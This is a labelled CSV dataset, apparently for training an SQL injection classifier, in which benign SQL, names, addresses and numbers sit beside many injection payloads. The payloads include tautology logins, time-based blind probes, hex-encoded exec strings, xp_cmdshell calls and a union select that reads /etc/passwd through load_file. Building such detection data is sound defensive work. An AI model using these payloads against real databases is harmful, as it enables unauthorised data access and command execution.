Query,Label
"""a"""" or 3=3--""",1
castellgal,0
""")) or benchmark(10000000,MD5(1))#",1
nogueira de ramun,0
SELECT * FROM winter WHERE thumb = 'drew' FETCH FIRST 3 ROWS ONLY,0
" SELECT * FROM directly ORDER BY thousand ASC, told DESC",0
6478,0
declare @s varchar (8000) select @s = 0x73656c ...,1
madrigal puigb,0
gasull vadell,0
"hi or 1=1 --""",1
a' or 1=1--,1
"   SELECT laid, surface, universeFROM colony WHERE five  IS NOT NULL",0
SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,0
dido,0
declare @s varchar (200) select @s = 0x73656c6 ...,1
' or 0=0 #,1
(||6),1
1) or sleep(__TIME__)#,1
?,1
//,1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
46183,0
4.13841E+15,0
or 0=0 --,1
(sqlattempt2),1
),1
DELETE FROM citizen,0
asc,1
%29,1
 UPDATE teacher SET occasionally = 'move'WHERE conversation = 'deer',0
SELECT drawn ( s ) FROM closer INNER JOIN,0
""";waitfor delay '0:0:__TIME__'--",1
or 2 between 1 and 3,1
or 3=3,1
DELETE FROM policeman,0
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',0
insert,1
SELECT COUNT ( ProductID )  AS NumberOfProducts FROM Products;,0
tharsis s/n 11?c,0
"benchmark(10000000,MD5(1))#",1
4ibari8a,0
6.81924E+15,0
3.10E+17,1
union select,1
olivares,0
SELECT AVG ( mistake )  FROM principal  SELECT SUM ( opinion ) ,0
1 waitfor delay '0:0:10'--,1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
"or 1=1 or """"=",1
""" or benchmark(10000000,MD5(1))#",1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
1)) or sleep(__TIME__)#,1
15873,0
exec(@s),1
0,1
(,1
SELECT itself ( s )  FROM grandfather FULL OUTER JOIN,0
or '1'='1,1
a' or 'a' = 'a,1
SELECT known ( s )  FROM usually,0
@variable,1
anything' OR 'x'='x,1
 or 1=1 --,1
SELECT * FROM island WHERE get BETWEEN '1996-07-01' AND '1996-07-31',0
group by userid having 1=1--,1
or 1=1 /*,1
8485,0
SELECT * FROM brief  WHERE cookies NOT LIKE '[well]%',0
' or 1 --',1
6.50345E+15,0
'||UTL_HTTP.REQUEST,1
SELECT COUNT ( top ) FROM model,0
""");waitfor delay '0:0:__TIME__'--",1
42462633x,0
truncate,1
'; exec xp_regread,1
&apos;%20OR,1
);waitfor delay '0:0:__TIME__'--,1
38470,0
SELECT AVG ( for ) FROM putting SELECT SUM ( season ) ,0
--sp_password,1
+sqlvuln,1
26 %,1
) or pg_sleep(__TIME__)--,1
7447,0
or ''=',1
union all select @@version--,1
""") or pg_sleep(__TIME__)--",1
"<>""'%;)(&+",1
nickonov,0
SELECT number FROM may,0
SELECT TOP 3 * FROM lie WHERE manner = 'happy' SELECT * FROM get,0
(sqlvuln),1
""") or sleep(__TIME__)=""",1
)) or pg_sleep(__TIME__)--,1
replace,1
union select * from users where login = char ...,1
SELECT * FROM thousand WHERE exciting = 'courage' LIMIT 3,0
||6,1
SELECT * FROM fifty FETCH FIRST 50 PERCENT ROWS ONLY,0
completorio,0
SELECT mood ( s FROM wild RIGHT JOIN,0
|,1
oliver@weat.gm,0
SELECT accident ( s )  FROM dull,0
"passatge credit, 93, 13-c",0
dueas cristaldo,0
valdehorna,0
correccionalmente,0
arganza,0
vadim,0
"INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )  ",0
SELECT * FROM Customers  WHERE CustomerName NOT LIKE 'a%';,0
kindermann@lawn.je,0
hi' or 'a'='a,1
(select top 1,1
' or (EXISTS),1
" SELECT Customers.CustomerName, Orders.OrderID INTO CustomersOrderBackup2017 FROM Customers  LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID;",0
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
or sleep(__TIME__)#,1
SELECT * FROM  ( SELECT chosen FROM goose ) ,0
SELECT * FROM children WHERE active = 'quiet' FETCH FIRST 3 ROWS ONLY,0
%26,1
DELETE FROM stomach WHERE memory = 'later',0
0x730065006c0065006300740020004000400076006500 ...,1
 or 3=3 --,1
SELECT those ( s )  FROM drawn SELECT wrong ( s ) ,0
21 %,1
gracindo@ajuntamentbcn2-0.jp,0
sqlvuln;,1
SELECT * FROM effect WHERE laugh = 'warm' FETCH FIRST 3 ROWS ONLY,0
; exec master..xp_cmdshell,1
SELECT AVG ( opposite )  FROM strike  SELECT SUM ( excitement ) ,0
%20or%20x=x,1
SELECT * FROM  ( SELECT compare FROM private ) ,0
40315,0
having,1
SELECT DISTINCT announced FROM next,0
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
-- &password=,1
or,1
vicens,0
%20$(sleep%2050),1
SELECT TOP 3 * FROM begun WHERE future = 'way',0
"  SELECT fall,empty FROM language WHERE darkness = 'distant' UNION SELECT way, never FROM made",0
"or 0=0 #""",1
select name from syscolumns where id = (sele ...,1
â or 3=3 --,1
' or user like '%,1
SELECT TOP 3 * FROM private WHERE track = 'everyone',0
SELECT AVG ( journey ) FROM orange SELECT SUM ( farm ) ,0
 UPDATE single SET view = 'at'WHERE huge = 'made',0
polvo,0
"  UPDATE hurried SET definition =  'lungs', City =  'statement' WHERE tea =  problem",0
SELECT TOP 3 * FROM review,0
""" or isNULL(1/0) /*",1
"   SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address   IS NULL;",0
'%20or%20''=',1
kaufherr.gargoet@santacruzdelvoto.sh,0
' or 1=1,1
order by,1
.32l6152v0o,0
rohtert,0
"c/ la hortensia, s/n",0
SELECT * FROM labor WHERE Price NOT BETWEEN 10 AND 20,0
"  SELECT roundID AS ID, our AS soon FROM writing",0
SELECT * FROM grow WHERE silence IN  ( SELECT jump FROM log ) ,0
"  SELECT * FROM fat WHERE practice IN  ( 'fifteen', 'wall', 'ear' )  ",0
48289,0
"  SELECT until,tube,blow FROM stopped LEFT JOIN Orders ON engine.silenceID =  everything.change ORDER BY metal.universe",0
"calle ginebra, 138",0
SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope',0
select * from information_schema.tables--,1
||'6,1
SELECT TOP 3 * FROM frog,0
SELECT TOP 50 PERCENT * FROM sad SELECT * FROM peace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shake,0
9.37032E+15,0
DELETE FROM rubber WHERE how = 'dirty',0
hi' or 1=1 --,1
" SELECT City, Country FROM Suppliers WHERE Country = 'Germany' ORDER BY City;",0
' or 1=1 or ''=',1
de tena leguizamn,0
nardi borgua,0
%27%20or%201=1,1
SELECT AVG ( but ) FROM coming,0
x' AND userid IS NULL; --,1
or 1 in (select @@version)--,1
'%20or%201=1,1
or 1=1--,1
declare @s varchar(22) select @s =,1
or sleep(__TIME__)=',1
SELECT * FROM said ORDER BY subject,0
'%20or%20'x'='x,1
SELECT * FROM riding WHERE    NOT work = 'known',0
"  SELECT got,author FROM might WHERE sand = 'journey' UNION SELECT including, hard FROM letter",0
â or 1=1 --,1
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM beauty,0
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0
" SELECT * FROM package ORDER BY headed ASC, word DESC",0
villarejo del valle,0
0x77616974666F722064656C61792027303A303A313027 ...,1
SELECT * FROM make FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM magic,0
SELECT * FROM Customers  WHERE City NOT LIKE '[bsp]%';,0
or username like char(37);,1
SELECT * FROM return WHERE substance LIKE '%largest%',0
hi') or ('a'='a,1
pl. emilio simon 28,0
or 'unusual' = 'unusual',1
nicholls@devuelos.vu,0
or 1=1--,1
' or username like '%,1
password:*/=1--,1
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0
1 or pg_sleep(__TIME__)--,1
pg_sleep(__TIME__)--,1
")) or benchmark(10000000,MD5(1))#",1
or 0=0 --,1
declare @q nvarchar (200) select @q = 0x770061 ...,1
a' or 3=3--,1
SELECT student FROM wore UNION SELECT sang FROM pour ORDER BY habit,0
85amo,0
x' OR full_name LIKE '%Bob%,1
or (EXISTS),1
or 1=1,1
procedure,1
SELECT COUNT ( table ) FROM location,0
SELECT * FROM headed WHERE too = 'active' LIMIT 3,0
jose cadalso s/n 7d,0
desc,1
or 2 > 1,1
satoh,0
broquel,0
//*,1
sant andreu salou,0
spain@erasmusrooms.bi,0
' (select top 1,1
2946,0
update,1
1;SELECT%20*,1
SELECT hearing ( s )  FROM changing SELECT reach ( s ) ,0
||UTL_HTTP.REQUEST,1
' or 0=0 --,1
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""m"" ) ;",0
',1
SELECT * FROM get WHERE Price NOT BETWEEN 10 AND 20,0
1 or 1=1,1
"1 or benchmark(10000000,MD5(1))#",1
ivon,0
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
""" or pg_sleep(__TIME__)--",1
a' waitfor delay '0:0:10'--,1
or a = a,1
%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11,1
SELECT COUNT ( completeID ) FROM ill,0
x' or 1=1 or 'x'='y,1
"llobregat 130,",0
# from wapiti,1
SELECT * FROM  ( SELECT tie FROM leather ) ,0
' or '1'='1'--,1
%28,1
SELECT * FROM  ( SELECT past FROM material ) ,0
79039106c,0
uni/**/on sel/**/ect,1
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT Orders.brotherrID, Employees.past, Employees.support FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fenceID ORDER BY Orders.mailID",0
or 'text' > 't',1
x' AND email IS NULL; --,1
""" or 1=1--",1
char%4039%41%2b%40SELECT,1
SELECT social ( s )  FROM principal UNION ALL,0
"""hi"""") or (""""a""""=""""a""",1
piols padilla,0
*paci3nte,0
admin' or ',1
more@soymuyguapa.es,0
declare @q nvarchar (200) 0x730065006c00650063 ...,1
29 %,1
or 1=1,1
SELECT are ( s )  FROM exclaimed,0
"  SELECT tallID AS ID, trick AS while FROM range",0
SELECT AVG ( range ) FROM position SELECT SUM ( silver ) ,0
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
"INSERT INTO nearer  ( stairs, officer, dear )  VALUES  ( 'band', 'throw', 'tales' )  ",0
SELECT everywhere ( s )  FROM also UNION,0
"  SELECT youngID AS ID, price AS wrapped FROM simply",0
kinsey@etnics.fm,0
cruz iparraguirre,0
or a=a,1
%2A%7C,1
!,1
SELECT * FROM principal WHERE case = 'poor',0
SELECT top ( s )  FROM wonder,0
' UNION SELECT,1
SELECT * FROM stepped WHERE mud BETWEEN '1996-07-01' AND '1996-07-31',0
correa cachopo,0
"  SELECT DAYOFWEEK ( ""2017-06-15"" ) ;",0
SELECT slave ( s )  FROM important UNION ALL,0
SELECT COUNT ( DISTINCT appropriate )  FROM completely,0
shih_brusse@professionalhost.jp,0
28 %,1
) or (a=a,1
PRINT,1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
SELECT AVG ( upon )  FROM farm  SELECT SUM ( dust ) ,0
""") or benchmark(10000000,MD5(1))#",1
bogarde4@tiendasyofertas.museum,0
'sqlattempt1,1
; begin declare @var varchar(8000) set @var=' ...,1
or '7659'='7659,1
pr99o9a9,0
%20or%201=1,1
488u7ra,0
5631,0
or%201=1,1
SELECT * FROM building WHERE saw IN  ( SELECT general FROM lift ) ,0
or isNULL(1/0) /*,1
"""a"""" or 1=1--""",1
) or sleep(__TIME__)=',1
SELECT * FROM reach WHERE happen = 'design'  AND City = 'signal',0
%21,1
SELECT * FROM ice WHERE week = 'which'  AND City = 'arm',0
SELECT AVG ( load ) FROM mountain SELECT SUM ( write ) ,0
SELECT * FROM ago  WHERE noon = blank,0
1.86E+15,0
/**/or/**/1/**/=/**/1,1
SELECT AVG ( copy )  FROM chose  SELECT SUM ( atom ) ,0
SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,0
and 1 in (select var from temp)--,1
SELECT * FROM swam WHERE pencil BETWEEN 'rays' AND 'according',0
' or ''=',1
handler,1
*(|(objectclass=*)),1
SELECT * FROM neighborhood FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cause,0
%20'sleep%2050',1
SELECT noise ( s )  FROM south FULL OUTER JOIN,0
SELECT form ( s )  FROM leaf SELECT husband FROM arrangement,0
%7C,1
SELECT * FROM snow WHERE search BETWEEN party09/01/1996stop AND hidden15/31/1996ourselves,0
SELECT MIN ( information )  AS fear FROM society,0
;waitfor delay '0:0:__TIME__'--,1
1.57143E+15,0
97,0
"INSERT INTO lips  ( smaller, solve, musical )  VALUES  ( 'gate', 'doll', 'baseball' )  ",0
2325,0
' or uname like '%,1
or 'text' = n'text',1
pettingill@demasiado.com.bv,0
1 or sleep(__TIME__)#,1
SELECT * FROM movie WHERE cry BETWEEN 'shaking' AND 'since',0
/,1
36930027p,0
to_timestamp_tz,1
mae,0
"   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) ",0
distinct,1
SELECT package ( s )  FROM discussion UNION,0
; or '1'='1',1
exec xp,1
maheu,0
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
SELECT option_value FROM wp_options WHERE option_name  =  'https_migration_required' LIMIT 1,0
' or a=a--,1
' UNION ALL SELECT,1
@var select @var as var into temp end --,1
moloney@imarbella.travel,0
"  SELECT Orders.layersrID, Employees.when, Employees.struggle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whenID ORDER BY Orders.woolID",0
0 or 1=1,1
indocto,0
UNION SELECT,1
SELECT SQRT ( 13 ) ;,0
yecla,0
SELECT * FROM strike WHERE fighting = 'accurate'  AND City = 'exact',0
SELECT * FROM pack FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM shown,0
fuentes calientes,0
bfilename,1
%20or%20''=',1
83236273d,0
0x770061006900740066006F0072002000640065006C00 ...,1
v70t4oso,0
gwohsing,0
or a = a,1
10836981w,0
or 1 --',1
*|,1
tz_offset,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
entendimiento,0
SELECT * FROM harder WHERE atom = 'voyage'  OR transportation = 'those',0
hi' or 'x'='x';,1
